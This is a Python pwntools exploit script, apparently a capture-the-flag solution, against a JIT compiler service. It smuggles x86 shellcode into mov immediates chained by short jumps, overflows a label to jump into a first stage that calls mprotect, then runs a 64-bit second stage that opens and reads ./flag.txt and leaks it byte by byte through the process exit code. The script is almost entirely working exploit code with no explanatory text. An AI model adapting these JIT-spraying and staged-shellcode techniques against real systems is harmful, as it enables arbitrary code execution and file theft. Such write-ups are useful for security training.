#!/usr/bin/env python3

from pwn import *
context.arch        = 'i386'
context.log_level   = 'CRITICAL'

REGS = {
    'eax': 'h0',
    'ebx': 'h1',
    'ecx': 'h2',
    'edx': 'h3',
}

def create_atom(inst):
    assert len(asm(inst)) <= 0x2
    return asm(inst) + b'\xeb'+p8(0x1) # a jump to skip the first byte of the next mov inst

def mov(reg,value):
    return f'mov {REGS[reg]},{value}\n'.encode()

def cmp(reg0,reg1):
    return f'cmp {REGS[reg0]},{REGS[reg1]}\n'.encode()

def ret():
    return b'ret\n'

def label(name):
    return name.encode()+b':\n'

def jmp(label):
    return f'jmp {label}\n'.encode()

def str(reg,idx):
    return f'str {REGS[reg]},{idx}\n'.encode()

def conn():
    # p = gdb.debug('./jit',gdbscript='''
    #     b main
    #     c
    #     b mprotect
    #     c
    #     b *$rdi+0x100
    #     c
    # ''')
    # p = process('./jit')
    p = remote(args.HOST or '127.0.0.1', args.PORT or 1337)
    return p 

def get_one_byte(idx):
    p = conn()

    sc_first_stage = b''
    sc_first_stage += create_atom('push edi; push edi') # same opcode as push rdi
    sc_first_stage += create_atom('mov esi,ebx') # esi = PAGE_SIZE
    sc_first_stage += create_atom('syscall')
    sc_first_stage += create_atom('pop edi ; pop edi')
    sc_first_stage += create_atom('jmp edi')

    with context.local(arch='amd64',bits=64):
        sc_second_stage = asm(f"""
    open:
        lea rbx, [rip+flag]
        mov ecx,0x0
            
        mov eax,0x5
        int 0x80
    
    read:
        mov edi,eax
        lea rsi,[rip+flag_bytes]
        mov rdx,0x100
                            
        mov eax,SYS_read
        syscall

    exit:
        xor edi,edi
        lea rsi,[rip+flag_bytes]
        mov dil,BYTE PTR[rsi+{idx}]

        mov eax,SYS_exit_group
        syscall
                
        flag:
            .string "./flag.txt"
                            
        flag_bytes:
    """).ljust(0x50,asm('nop'))

    # fill the first page with some instructions with a nop slide
    # function prologue     movs    cmps    
    # 15                +   41*5 +  17*2 =  254
    payload  = b''
    payload += mov('eax',0x0)*41
    payload += cmp('eax','ebx')*17 # just to fill up the gap

    # start of our sc_first_stage execution which will call mprotect on the data section
    for i in range(0, len(sc_first_stage), 4):   
        payload += mov('eax',u32(sc_first_stage[i:i+4]))

    # fill the data section with sc_second_stage that will have our shellcode to orw the flag
    for i in range(0, len(sc_second_stage), 4):
        payload += mov('eax',u32(sc_second_stage[i:i+4]))
        payload += str('eax',i)

    payload += mov('eax',0xa)   # SYS_mprotect
    payload += mov('ebx',0x1000)
    payload += mov('edx',0x7)

    payload += label('A'*0x20)  # label to overflow
    payload += jmp('A'*0x20)    # trigger the jump to our sc_first_stage
    payload += ret()            # return to finish the function and start jit execution

    p.sendline(payload)

    byte = int(p.recvall().strip().split()[-1],base=10)
    if byte == 0:
        return None
    return p8(byte)


idx     = 0
flag    = b''

with log.progress('Flag....',level=logging.CRITICAL) as l:
    while True:
        b = get_one_byte(idx)
        if b == None:
            l.success(flag.decode())
            break
        flag+= b
        l.status(flag.decode())
        idx+=1
